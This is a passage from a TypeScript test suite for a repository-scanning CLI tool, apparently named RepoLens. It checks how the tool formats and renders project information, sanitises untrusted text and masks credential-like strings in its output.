      ' a',
      '',
    ]) {
      expect(isCopyableCommand(command), command).toBe(false)
    }
  })

  it('describes Git state', () => {
    const git: GitSection = {
      branch: null,
      head: 'abc1234',
      remotes: [
        { name: 'upstream', url: 'https://github.com/other/api.git' },
        { name: 'origin', url: 'git@github.com:acme/api.git' },
      ],
      submodules: ['vendor/a', 'vendor/b'],
      lfs: true,
      trackedFiles: 10,
      linkedWorktree: false,
    }
    expect(describeGit(git)).toEqual(['detached HEAD @ abc1234', 'github.com/acme/api', '2 submodules', 'LFS'])
    expect(describeGit({ ...git, branch: 'main', head: null, remotes: [], submodules: [], lfs: false })).toEqual([
      'main',
    ])
    expect(describeGit(null, 'https://github.com/acme/api')).toEqual(['github.com/acme/api'])
  })

  it('describes the project type', () => {
    const project = sampleScanResult().project
    const workspace = sampleScanResult().workspace
    expect(describeProjectType(project, workspace)).toBe('Monorepo · 4 packages (pnpm workspaces, Turborepo)')
    expect(describeProjectType(project, workspace, { separator: ' - ', tools: false })).toBe('Monorepo - 4 packages')
    expect(describeProjectType({ ...project, type: 'unknown' }, null)).toBeNull()
    expect(describeProjectType({ ...project, type: 'cli' }, null)).toBe('CLI tool')
    const toolsOnly = { tools: workspace?.tools ?? [], patterns: [], packages: [] }
    expect(describeProjectType({ ...project, type: 'unknown' }, toolsOnly)).toBe(
      'Workspace (pnpm workspaces, Turborepo)',
    )
  })

  it('formats language shares', () => {
    expect(formatShare(0.738)).toBe('74%')
    expect(formatShare(0.004)).toBe('<1%')
    expect(formatShare(0)).toBe('0%')
    const top = topLanguages(sampleScanResult().languages, 3).map((l) => l.name)
    expect(top).toEqual(['TypeScript', 'Vue', 'Go'])
    const styleFirst = topLanguages(
      [
        { name: 'CSS', kind: 'style', files: 50, share: 0.5 },
        { name: 'Go', kind: 'programming', files: 10, share: 0.1 },
      ],
      4,
    )
    expect(styleFirst.map((l) => l.name)).toEqual(['Go', 'CSS'])
  })

  it('formats ports', () => {
    expect(formatPort({ host: 5432, container: 5432, protocol: 'tcp', raw: '5432:5432' })).toEqual({
      text: ':5432',
      published: true,
    })
    expect(formatPort({ host: 53, container: 53, protocol: 'udp', raw: '53:53/udp' }).text).toBe(':53/udp')
    expect(formatPort({ host: 80, container: 80, protocol: 'tcp', hostIp: '::1', raw: '[::1]:80:80' }).text).toBe(
      '[::1]:80',
    )
    expect(formatPort({ host: 80, container: 80, protocol: 'tcp', hostIp: '0.0.0.0', raw: '0.0.0.0:80:80' }).text).toBe(
      ':80',
    )
    const interpolated = ['$', '{PORT:-3000}'].join('') // Compose interpolation, not a JS template
    expect(formatPort({ host: interpolated, container: 3000, protocol: 'tcp', raw: '' }).text).toBe(`:${interpolated}`)
    expect(formatPort({ host: null, container: 9229, protocol: 'tcp', raw: '9229' })).toEqual({
      text: '9229',
      published: false,
    })
    const ports = servicePorts(
      service('x', {
        ports: [
          { host: null, container: 1, protocol: 'tcp', raw: '1' },
          { host: 2, container: 2, protocol: 'tcp', raw: '2:2' },
          { host: 2, container: 2, protocol: 'tcp', raw: '2:2' },
        ],
        expose: ['1', '3'],
      }),
    )
    expect(ports.map((p) => p.text)).toEqual([':2', '1', '3'])
  })

  it('ranks environment variables by urgency', () => {
    const undocumented = variable('Z', { used: true })
    const localOnly = variable('Y', { defined: true })
    const missingLocally = variable('X', { documented: true, used: true })
    const unused = variable('W', { documented: true, defined: true })
    const fine = variable('A', { documented: true, defined: true, used: true })
    expect([undocumented, localOnly, missingLocally, unused, fine].map((v) => variableRank(v, true))).toEqual([
      0, 1, 2, 3, 4,
    ])
    expect(variableRank(missingLocally, false)).toBe(4)
    expect(sortByUrgency([fine, unused, undocumented], true).map((v) => v.name)).toEqual(['Z', 'W', 'A'])
  })

  it('groups scripts', () => {
    const groups = groupScripts([
      script('b', { source: 'packages/b/package.json', package: 'packages/b' }),
      script('test', { category: 'test' }),
      script('x', { source: 'Makefile' }),
      script('dev', { category: 'dev' }),
      script('a', { source: 'packages/a/package.json', package: undefined }),
      script('build', { source: 'packages/b/package.json', package: 'packages/b', category: 'build' }),
    ])
    expect(groups.root.map((s) => s.name)).toEqual(['dev', 'test'])
    expect(groups.targets.map((s) => s.name)).toEqual(['x'])
    expect(groups.packages.map((g) => [g.path, g.scripts.map((s) => s.name)])).toEqual([
      ['packages/a', ['a']],
      ['packages/b', ['build', 'b']],
    ])
  })

  it('summarizes CI workflows', () => {
    const workflow = sampleScanResult().ci.workflows[0]
    expect(workflow && workflowTasks(workflow)).toEqual(['lint', 'typecheck', 'test', 'build'])
    expect(workflowLabel('.github/workflows/release.yml')).toBe('release.yml')
    expect(workflowLabel('.gitlab-ci.yml')).toBe('.gitlab-ci.yml')
  })

  it('picks the most informative config files', () => {
    const files = genericResult().configFiles
    expect(pickKeyFiles(files, 2).map((f) => f.path)).toEqual(['Makefile', 'pyproject.toml'])
    expect(pickKeyFiles(files, 10)).toHaveLength(4)
  })

  it('orders diagnostics and categories', () => {
    const sorted = sortBySeverity([
      diagnostic('I', 'info'),
      diagnostic('W1', 'warning'),
      diagnostic('E', 'error'),
      diagnostic('W2', 'warning'),
    ])
    expect(sorted.map((d) => d.code)).toEqual(['E', 'W1', 'W2', 'I'])
    expect(worstSeverity(['info', 'warning'])).toBe('warning')
    expect(worstSeverity([])).toBeNull()
    expect(categoryTitle('package-manager')).toBe('Package manager')
    expect(categoryTitle('something_new')).toBe('Something new')
  })

  it('finds scan warnings that no diagnostic already reports', () => {
    const warnings = [
      { kind: 'parse' as const, file: 'a.yml', message: "Couldn't parse a.yml" },
      { kind: 'error' as const, message: 'Doctor check X failed to run' },
    ]
    const covered = uncoveredWarnings(warnings, [
      diagnostic('CONFIG_PARSE_ERROR', 'warning', { message: "Couldn't parse a.yml" }),
    ])
    expect(covered).toEqual([{ kind: 'error', message: 'Doctor check X failed to run' }])
  })

  it('phrases notes and details', () => {
    expect(warningText({ kind: 'parse', message: "Couldn't parse a.yml" })).toBe("RepoLens couldn't parse a.yml")
    expect(warningText({ kind: 'size', message: 'Skipped big.json because it is larger than the read limit' })).toBe(
      'Skipped big.json because it is larger than the read limit',
    )
    expect(detailLine('\n  Error: boom\n    at x (/abs/path.js:1:1)')).toBe('Error: boom')
    expect(detailLine(`Unexpected token 'h', ..."password": hunter2"... is not valid JSON`)).toBe(
      "Unexpected token 'h' (not valid JSON)",
    )
    expect(detailLine(`Unexpected token '"', "{"a": x}" is not valid JSON`)).toBe(
      `Unexpected token '"' (not valid JSON)`,
    )
    expect(detailLine('"[object Object]" is not valid JSON')).toBe('Not valid JSON')
    const positional = "Expected ',' or '}' after property value in JSON at position 56 (line 1 column 57)"
    expect(detailLine(positional)).toBe(positional)
  })

  it('formats numbers without depending on the locale', () => {
    expect(formatNumber(1234567)).toBe('1,234,567')
    expect(formatNumber(999)).toBe('999')
    expect(plural(1, 'error')).toBe('1 error')
    expect(plural(2000, 'file')).toBe('2,000 files')
  })
})

describe('text primitives', () => {
  it('cleans untrusted text', () => {
    expect(clean(`a${ESC}[31mb`)).toBe('a[31mb')
    expect(clean('one\r\n  two\tthree')).toBe('one two three')
    expect(clean('  keep  inner  spacing  ')).toBe('  keep  inner  spacing  ')
    expect(clean('\nstarts with a break')).toBe('starts with a break')
    expect(clean(`x${String.fromCharCode(0x200b)}y${String.fromCharCode(0x2066)}z`)).toBe('xyz')
    // Arabic letter mark (bidi) and Unicode tag characters, which can hide text.
    const tagged = `a${String.fromCharCode(0x061c)}b${String.fromCodePoint(0xe0041, 0xe0042)}c`
    expect(clean(tagged)).toBe('abc')
  })

  it('fits lines with an ellipsis in the style of the cut span', () => {
    const bold = (t: string) => `<${t}>`
    const line = [span('abc'), span('defgh', bold)]
    expect(paintLine(fitLine(line, 8, true))).toBe('abc<defgh>')
    expect(paintLine(fitLine(line, 6, true))).toBe('abc<de…>')
    expect(paintLine(fitLine(line, 6, false))).toBe('abc<...>')
    expect(paintLine(fitLine(line, 2, false))).toBe('..')
    expect(paintLine(fitLine([span('abcdefgh')], 6, false))).toBe('abc...')
  })

  it('wraps words and splits words longer than a line', () => {
    expect(wrap('the quick brown fox', 9)).toEqual(['the quick', 'brown fox'])
    expect(wrap('abcdefghij', 4)).toEqual(['abcd', 'efgh', 'ij'])
    expect(wrap('', 10)).toEqual([''])
  })

  it('joins as many items as fit', () => {
    const items = ['alpha', 'beta', 'gamma', 'delta'].map((t) => [span(t)])
    const more = (n: number) => [span(`+${n} more`)]
    expect(paintLine(joinFit(items, [span(', ')], 100, more, true))).toBe('alpha, beta, gamma, delta')
    expect(paintLine(joinFit(items, [span(', ')], 22, more, true))).toBe('alpha, beta, +2 more')
    expect(lineWidth(joinFit(items, [span(', ')], 5, more, true))).toBeLessThanOrEqual(5)
  })

  it('aligns table columns and shrinks the widest column to the width', () => {
    const { lines: rows, offsets } = table(
      [
        ['a', 'bb', 'last'],
        ['ccc', '', 'x'],
      ],
      { width: 40, unicode: true },
    )
    expect(rows.map(paintLine)).toEqual(['  a    bb  last', '  ccc      x'])
    expect(offsets).toEqual([2, 7, 11])
    const narrow = table([['a-very-long-first-column-value', 'b-second-column-value', 'tail']], {
      width: 30,
      unicode: true,
    })
    expect(lineWidth(narrow.lines[0] ?? [])).toBeLessThanOrEqual(30)
  })

  it('never breaks a backtick-quoted command across lines (UX-10)', () => {
    const hint = 'Add "packageManager": "npm@<version>" to package.json (`corepack use npm@latest` does this)'
    for (const width of [26, 30, 40, 60]) {
      const wrapped = wrap(hint, width)
      expect(
        wrapped.filter((line) => line.includes('`corepack use npm@latest`')),
        `width ${width}`,
      ).toHaveLength(1)
    }
    // An unmatched backtick is an ordinary character.
    expect(wrap('a ` b c d', 3)).toEqual(['a `', 'b c', 'd'])
    // A span longer than a line is still split rather than overflowing.
    expect(wrap('`abcdefgh`', 4).every((line) => [...line].length <= 4)).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// Regressions found in review
// ---------------------------------------------------------------------------

describe('review regressions', () => {
  it('keeps RepoLens hints intact instead of redacting them (ACC-L1)', () => {
    const result = makeResult({
      doctor: doctorOf([
        diagnostic('ENV_UNDOCUMENTED', 'warning', { hint: 'Add OBSERVE_APP_KEY=, PORT= to .env.example' }),
        diagnostic('ENV_X', 'warning', { hint: `Remove sk_${'live'}_${'a1B2c3D4e5F6g7H8i9J0'} from .env.example` }),
      ]),
    })
    const output = renderDoctor(result, options())
    expect(output).toContain('Add OBSERVE_APP_KEY=, PORT= to .env.example')
    // Well-known credential formats are still masked.
    expect(output).toContain('Remove *** from .env.example')
  })

  it('says how many low-confidence routes it hid (ACC-M10)', () => {
    const output = lines(renderScan(sampleScanResult(), options()))
    expect(output).toContain('  +1 low-confidence route (use --verbose)')
    expect(output.join('\n')).not.toContain('/internal/debug')
    const verbose = renderScan(sampleScanResult(), options({ verbose: true }))
    expect(verbose).toContain('/internal/debug')
    expect(verbose).not.toContain('low-confidence route')
  })

  it('shows long route paths and workspace scripts in full with --verbose (UX-24)', () => {
    // Longer than the old 44-column cap, and one longer than the terminal itself.
    const path = `/api/${'long-segment/'.repeat(4)}:id`
    const huge = `/v1/${'x'.repeat(130)}`
    const result = sampleScanResult()
    for (const [route, line] of [
      [path, 7],
      [huge, 9],
    ] as const) {
      result.routes.routes.push({
        method: 'GET',
        path: route,
        kind: 'api',
        framework: 'fastify',
        file: 'apps/api/src/routes/long.ts',
        line,
        confidence: 'high',
        package: 'apps/api',
      })
    }
    result.scripts.scripts.push({
      name: 'typecheck',
      command: 'vue-tsc --noEmit -p tsconfig.app.json',
      run: 'pnpm --filter @acme/web typecheck',
      source: 'apps/web/package.json',
      package: 'apps/web',
      category: 'typecheck',
    })
    const output = lines(renderScan(result, options({ verbose: true, width: 100 })))
    // Locations line up after the paths, or move to their own line; paths are never cut.
    expect(output).toContain(`  GET     ${path}`)
    expect(output).toContain(`          apps/api/src/routes/long.ts:7`)
    expect(output.join('').replaceAll(' ', '')).toContain(huge)
    expect(output).toContain(`          apps/api/src/routes/long.ts:9`)
    expect(output).toContainEqual(
      expect.stringMatching(/^ {4}pnpm --filter @acme\/web typecheck +vue-tsc --noEmit -p tsconfig\.app\.json$/),
    )
    expectWithinWidth(output.join('\n'), 100)
  })

  it('shows what a Compose service builds from and lists only unused Dockerfiles', () => {
    const dockerfile = (path: string) => ({
      path,
      baseImages: ['node:22-alpine', 'node:22-alpine', 'node:22-alpine'],
      stages: 3,
      exposes: ['3000'],
      args: [],
    })
    const result = makeResult({
      services: {
        composeFiles: ['deploy/compose.yaml'],
        dockerfiles: [dockerfile('Dockerfile'), dockerfile('tools/Dockerfile')],
        services: [
          service('app', {
            source: 'deploy/compose.yaml',
            build: '..',
            kind: 'app',
            ports: [{ host: 3000, container: 3000, protocol: 'tcp', raw: '3000:3000' }],
          }),
        ],
      },
    })
    const output = lines(renderScan(result, options()))
    expect(output).toContainEqual(
      expect.stringMatching(/^ {2}app\s+build \. → node:22-alpine \(3 stages\)\s+:3000\s+app$/),
    )
    const dockerfiles = output.indexOf('Dockerfiles')
    expect(dockerfiles).toBeGreaterThan(-1)
    expect(output[dockerfiles + 1]).toMatch(/^ {2}tools\/Dockerfile\s+node:22-alpine\s+3 stages\s+expose 3000$/)
    expect(output.filter((line) => /^ {2}Dockerfile\b/.test(line))).toEqual([])
  })

  it('labels the environment columns and marks what needs attention sensibly', () => {
    const result = makeResult({
      environment: {
        files: [
          { path: '.env.local', kind: 'local', variables: 1, ignored: true, tracked: false },
          { path: '.env.example', kind: 'example', variables: 1, ignored: false, tracked: true },
        ],
        variables: [
          variable('CI', { used: true }),
          variable('NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY', {
            used: true,
            documented: true,
            public: true,
            sensitive: true,
          }),
          variable('PORT', { used: true, documented: true, fallback: true }),
          variable('TEST_DATABASE_URL', { used: true, testOnly: true }),
          variable('UNDOCUMENTED', { used: true }),
        ],
        usageTruncated: false,
      },
    })
    const output = lines(renderScan(result, options()))
    expect(output).toContainEqual(expect.stringMatching(/^\s+local\s+example\s+code$/))
    expect(output).toContainEqual(expect.stringMatching(/NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY.*✓\s+public$/))
    expect(output).toContainEqual(expect.stringMatching(/^ {2}PORT\s.*✓\s+default$/))
    expect(output.join('\n')).not.toContain('TEST_DATABASE_URL')
    expect(output).toContain('  … 1 test-only variable (use --verbose)')
    // The project's own undocumented variable ranks first; CI is the platform's.
    const names = output.filter((line) => /^ {2}[A-Z]/.test(line)).map((line) => line.trim().split(/\s+/)[0])
    expect(names[0]).toBe('UNDOCUMENTED')

    const verbose = renderScan(result, options({ verbose: true }))
    expect(verbose).toMatch(/TEST_DATABASE_URL.*test only/)
    expect(verbose).not.toMatch(/public, secret/)

    // Only the project's own variable gets the yellow cross; CI's is dim.
    const yellow = (text: string) => `${ESC}[33m${text}${ESC}[39m`
    const colored = renderScan(result, options({ color: true })).split('\n')
    expect(colored.find((line) => line.includes('UNDOCUMENTED'))).toContain(yellow('✗'))
    expect(colored.find((line) => /\bCI\b/.test(stripAnsi(line)))).not.toContain(yellow('✗'))
  })

  it('names the missing files in the environment legend', () => {
    const result = makeResult({
      environment: {
        files: [{ path: '.env.local.example', kind: 'example', variables: 1, ignored: false, tracked: true }],
        variables: [variable('PORT', { documented: true, used: true })],
        usageTruncated: false,
      },
    })
    expect(lines(renderScan(result, options()))).toContain('  – file not present (.env.local)')
    const neither = makeResult({
      environment: { files: [], variables: [variable('PORT', { used: true })], usageTruncated: false },
    })
    expect(lines(renderScan(neither, options()))).toContain('  – file not present (.env, .env.example)')
  })

  it('splits tooling into rows and leaves EditorConfig to the key files (UX-15)', () => {
    const tool = (id: string, name: string, kind: Tool['kind']): Tool => ({
      id,
      name,
      kind,
      configFiles: [],
      packages: ['.'],
      confidence: 'high',
      evidence: [],
    })
    const result = makeResult({
      linting: {
        tools: [
          tool('eslint', 'ESLint', 'linter'),
          tool('prettier', 'Prettier', 'formatter'),
          tool('typescript', 'TypeScript', 'typechecker'),
          tool('husky', 'Husky', 'git-hooks'),
          tool('editorconfig', 'EditorConfig', 'other'),
        ],
      },
    })
    const output = lines(renderScan(result, options()))
    const start = output.indexOf('Tooling')
    expect(output.slice(start + 1, start + 5)).toEqual([
      '  Linting          ESLint',
      '  Formatting       Prettier',
      '  Types            TypeScript',
      '  Git hooks        Husky',
    ])
    expect(output.join('\n')).not.toContain('EditorConfig')
  })

  it('lists CI tasks without pass/fail symbols (UX-16)', () => {
    const output = lines(renderScan(sampleScanResult(), options()))
    expect(output).toContain('  ci.yml           lint · typecheck · test · build')
  })

  it('orders summaries errors, warnings, info, passed and never says "infos" (UX-17)', () => {
    const result = sampleScanResult()
    result.doctor.summary.infos = 2
    for (const output of [renderScan(result, options()), renderDoctor(result, options())]) {
      expect(output).toMatch(/✗ 1 error.*⚠ 2 warnings.*ℹ 2 info.*✓ 18/)
      expect(output).not.toContain('infos')
    }
  })

  it('reports an unparsable file once, not as an issue, a note and a scan warning (UX-18)', () => {
    const result = makeResult({
      doctor: doctorOf([
        diagnostic('PACKAGE_JSON_INVALID', 'error', {
          category: 'configuration',
          message: 'package.json is not valid JSON',
          files: ['package.json'],
        }),
      ]),
      meta: {
        files: 2,
        config: { sources: [], settings: {} },
        truncated: false,
        warnings: [
          { kind: 'parse', file: 'package.json', message: "Couldn't parse package.json", detail: 'Unexpected token' },
        ],
      },
    })
    const scan = renderScan(result, options())
    expect(scan).not.toContain('Notes')
    expect(scan).not.toContain("couldn't parse package.json")
    expect(renderDoctor(result, options())).not.toContain('scan warning')
    expect(renderDoctor(result, options({ verbose: true }))).toContain('Unexpected token')
  })

  it('points follow-up commands at the scanned path, quoted', () => {
    const result = sampleScanResult()
    expect(renderScan(result, options({ commandPath: '../api' }))).toContain('Run repolens doctor ../api for details')
    expect(renderScan(result, options({ commandPath: 'my repo' }))).toContain(
      "Run repolens doctor 'my repo' for details",
    )
    expect(renderScan(result, options())).toContain('Run repolens doctor for details')
  })
})
